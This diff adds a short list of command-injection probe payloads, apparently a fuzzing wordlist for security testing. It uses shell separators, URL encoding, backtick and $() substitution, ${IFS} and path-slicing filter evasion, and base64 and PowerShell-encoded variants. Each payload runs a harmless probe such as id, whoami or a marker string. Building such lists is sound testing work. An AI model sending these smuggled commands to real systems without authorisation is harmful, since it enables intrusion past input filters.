@@ -1,0 +1,23 @@
+# Command injection encoding and shell context probes
+%3bid
+%7cid
+%26%26id
+%0aid
+%0did
+%09id
+`id`
+$(id)
+${IFS}id
+id${IFS}-u
+i	d
+i${PATH:0:1}d
+echo%20Q01ESV9DT05GSVJNRUQ%3d%7cbase64%20-d
+powershell -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABDAE0ARABJAF8ATwBLAA==
+cmd /c whoami
+& whoami
+| whoami
+&& whoami
+|| whoami
+; printf CMDI_OK
+$(printf CMDI_OK)
+`printf CMDI_OK`
